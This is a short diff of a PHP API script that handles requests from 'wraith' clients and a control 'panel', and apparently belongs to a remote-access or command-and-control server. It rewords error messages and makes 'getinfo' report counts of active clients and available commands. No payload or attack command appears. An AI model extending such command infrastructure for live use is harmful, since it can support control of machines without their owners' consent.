@@ -245,7 +245,7 @@ if ($response["requester_type"] === "wraith") {
 		
 	}  else {
 		$response["status"] = "ERROR";
-		$response["message"] = "A non-existent command was supplied to the API";
+		$response["message"] = "A non-existent command was requested";
 		respond();
 	}
 
@@ -253,8 +253,13 @@ if ($response["requester_type"] === "wraith") {
 } elseif ($response["requester_type"] === "panel") {
 	$req_type = $request["message_type"];
 	if ($req_type === "getinfo") {
+		$db = get_db();
 		$response["status"] = "SUCCESS";
-		$response["data"] = json_encode(['test' => 'testing', 'test2' => 'testing', 'test3' => 'testing']);
+		$response["data"] = json_encode([
+			"Active Wraiths" => sizeof($db["active_wraith_clients"]),
+			"Available Commands" => sizeof(get_cmds()),
+			"API Address" => get_current_url($_SERVER),
+		]);
 		respond();
 
 	} elseif ($req_type === "getwraiths") {
@@ -271,7 +276,7 @@ if ($response["requester_type"] === "wraith") {
 		
 	} else {
 		$response["status"] = "ERROR";
-		$response["message"] = "A non-existent command was supplied to the API";
+		$response["message"] = "A non-existent command was requested";
 		respond();
 	}
 }
